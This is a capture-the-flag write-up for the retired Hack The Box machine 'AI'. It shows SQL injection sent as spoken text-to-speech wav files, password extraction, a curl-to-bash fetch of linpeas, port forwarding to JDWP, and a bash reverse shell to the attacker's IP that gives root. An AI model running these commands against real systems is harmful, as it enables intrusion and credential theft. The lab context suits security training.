# AI

This is the write-up for the box AI that got retired at the 25th January 2020.
My IP address was 10.10.14.9 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.163    ai.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/ai.nmap 10.10.10.163
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello AI!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web pages homepage is on _index.php_ and it shows **Artificial Intelligence**.
On the left side is a menu and the _"About page"_ says the following:
```
We are working on search engine using voice recognition from audio files using Artificial intelligence.
Our developers working 24/7 to make it happen and we progressed well with audio conversion.
```

This AI can be found on the menu that forwards to _ai.php_ and allows to upload and process _wav_ files:

![Upload wav file](https://kyuu-ji.github.io/htb-write-up/ai/ai_web-1.png)

After uploading a PHP file, it seems to not get blocked, but does not show any output:
```
Our understanding of your input is :
Query result :
```

Lets search for hidden directories and PHP files with **Gobuster**:
```
gobuster -u http://10.10.10.163 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

It finds the following directories and PHP files:
- _/uploads_ (403 Forbidden)
- _/db.php_
  - Blank page
- _/intelligence.php_
  - Shows how the Speech Recognition API processes user input:

![Speech Recognition API process](https://kyuu-ji.github.io/htb-write-up/ai/ai_web-2.png)

These look like aliases for words and as it expects audio _wav_ files, it could be possible to execute code by sending words via a **Text-to-Speech** program.

The package **Festival** has a command **text2wave** that I will use for this:
```
apt install festival

echo "hello" | text2wave -o hello.wav
```

This wave file can be listened to with any audio program and it says _"hello"_.
After uploading it to the AI, it understood it and shows the output of it:
```
Our understanding of your input is : hello
Query result :
```

Testing one of the queries:
```
echo "Say hi python" | text2wave -o test1.wav
```
```
Our understanding of your input is : say hi python
Query result : print("hi")
```

Testing special characters like single quotes:
```
echo "open single quote" | text2wave -o sqli.wav
```
```
Our understanding of your input is : '
Query result : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
```

It processed the single quote and shows a SQL error, so lets use that for **SQL Injection**.

### SQL Injection with Wave File

Testing for **Union SQL Injection**:
```
echo "open single quote, union select, version open parenthesis close parenthesis hyphen hyphen, space hyphen" | text2wave -o sqli.wav
```
```
Our understanding of your input is : 'you can select version()- - -
Query result : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'you can select version()- - -'' at line 1
```

It did not fully understand the _union_ statement, but the queries showed that it can be translated with _"join"_.
Also the comment for databases was not understood, but it can be translated with _"Comment Database"_.
```
echo "open single quote, join select, version open parenthesis close parenthesis Comment Database" | text2wave -o sqli.wav
```
```
Our understanding of your input is : 'union select version()-- -
Query result : 5.7.27-0ubuntu0.18.04.1
```

It understood the query and displays the version of the database.

Enumerating usernames by guessing tables:
```
echo "open single quote, join, select, username from users Comment Database" | text2wave -o sqli.wav
```
```
Our understanding of your input is : 'union select username from users -- -
Query result : alexa
```

Getting the password of _alexa_:
```
echo "open single quote, join, select, password from users Comment Database" | text2wave -o sqli.wav
```
```
Our understanding of your input is : 'union select password from users -- -
Query result : H,Sq9t6}a<)?q93_
```

It looks like a plaintext password and not a hash and the credentials work on SSH:
```
ssh alexa@10.10.10.163
```

## Privilege Escalation

To get an attack surface, it is recommended to run any **Linux Enumeration Script**:
```
curl 10.10.14.9/linpeas.sh | bash
```

On localhost port 8000, 8005, 8009 and 8080 runs **JDWP (Java Debug Wire Protocol)** and **Tomcat** as root.

Port forwarding the ports to get access to the services:
```
ssh -L 8009:127.0.0.1:8009 -L 8080:127.0.0.1:8080 -L 8005:127.0.0.1:8005 alexa@10.10.10.163
```

Forwarding port 8000 with the [SSH control sequences](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/) as it did not work with SSH directly:
```
ssh> -L8000:127.0.0.1:8000

Forwarding port.
```

Now it is possible to connect to **JDWP** from our local client:
```
jdb -attach 8000
```

The command `classes` shows all available classes and we want to execute _java.lang.Runtime exec_.
First it has to be attached to a running thread and these can be found with the `threads` command and `trace go method` command.

Setting a breakpoint at any thread:
```
stop in java.lang.String.indexOf(int)
```

Testing if it works by creating a file:
```
print new java.lang.Runtime().exec("/bin/touch /tmp/Test.txt")
```

This creates the file with root as the owner, but as it takes many tries and is inconsistent, it is easier to exploit it with the tool [jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier).

Creating a bash file on the box that executes a reverse shell connection:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.9/9001 0>&1'
```
```
chmod +x shell.sh
```

Executing _shell.sh_ with **jdwp-shellifier**:
```
python jdwp-shellifier.py -t 127.0.0.1 --break-on "java.lang.String.indexOf" --cmd "bash /tmp/shell.sh"
```

After executing, the listener on my IP and port 9001 starts a reverse shell session as root!
